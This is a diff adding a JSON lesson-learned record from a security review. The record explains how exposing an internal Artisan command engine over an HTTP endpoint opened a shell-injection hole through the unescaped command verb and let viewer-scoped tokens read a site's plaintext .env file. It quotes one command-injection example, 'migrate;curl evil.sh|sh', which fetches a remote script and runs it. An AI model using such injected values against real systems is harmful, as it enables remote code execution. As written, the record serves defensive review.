@@ -1,0 +1,18 @@
+{
+  "content": "When putting an existing internal engine behind an HTTP endpoint, re-audit its trust assumptions rather than its behaviour: what it interpolates unescaped, and what its permission tiers actually admit for the identity the new caller carries. Both gaps here were invisible from the engine's own tests, which only ever exercised the trusted caller. Validate operator-shaped inputs at the new boundary (a strict verb regex) and re-check that a Read classification is still Read when the reader is a viewer rather than an operator.",
+  "context": "RemoteCli\\\\Services\\\\Artisan::buildShellCommand() escapes its args but interpolates the command verb raw, which was fine while the only caller was 'php artisan dply:artisan' with an operator's shell argv. Exposing the same engine at POST /sites/{site}/artisan made the verb attacker-controlled ('migrate;curl evil.sh|sh'). Separately, the engine classifies the env family as Read, and RemoteCliPermissions lets Read through on SitePolicy::view - a workspace viewer - so the new endpoint would have handed a viewer-scoped token the site's plaintext .env.",
+  "createdDate": "2026-09-04",
+  "id": "L-003",
+  "lastValidated": "2026-09-04",
+  "reinforcements": 0,
+  "source": "review",
+  "status": "active",
+  "supersedes": null,
+  "tags": [
+    "security",
+    "api",
+    "remote-execution"
+  ],
+  "title": "An engine that is safe for operator argv is not automatically safe behind an API token",
+  "updatedDate": "2026-09-04"
+}
